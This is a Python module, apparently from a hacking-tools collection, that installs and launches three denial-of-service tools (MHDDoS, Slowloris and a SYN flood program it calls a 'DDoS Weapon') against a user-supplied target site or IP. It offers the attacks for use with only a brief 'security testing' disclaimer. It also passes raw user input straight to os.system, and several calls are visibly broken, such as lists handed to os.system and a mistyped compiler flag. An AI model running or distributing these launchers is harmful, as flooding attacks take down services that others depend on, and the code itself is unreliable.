# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection

class MHDDoS(HackingTool):
    TITLE ="MHDDoS"
    DESCRIPTION = "DDoS Attack Scripts with 56 Methods." \
                  "\n\b DDoS attacks" \
                  "for SECURITY TESTING PURPOSES ONLY! \n " \
                    "Please refer to the Project Page for more guidance! "
    INSTALLED_SIZE = "N/A"
    INSTALL_COMMANDS = [
        "git clone https://github.com/MatrixTM/MHDDoS.git",
        "cd MHDDoS;sudo pip install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/MatrixTM/MHDDoS.git"

    def run(self):
        os.system(["cd /home/afoht/MHDDoS; python3 start.py HELP"])
        subinput = input("MHDDoS => ")
        os.system([subinput])


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = "Slowloris is basically an HTTP Denial of Service attack." \
                  "It floods targeted sites with HTTP Requests"
    INSTALLED_SIZE = "36 KB"
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, mulltifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALLED_SIZE = "N/A"
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatihsnsy/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread -02"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        os.system("cd aSYNcrone;")
        subprocess.run([
            "sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000])



class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [
        SlowLoris(),
        Asyncrone(),
        MHDDoS()
    ]
